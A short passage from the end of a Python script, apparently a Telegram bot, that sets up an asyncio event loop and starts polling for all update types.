        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
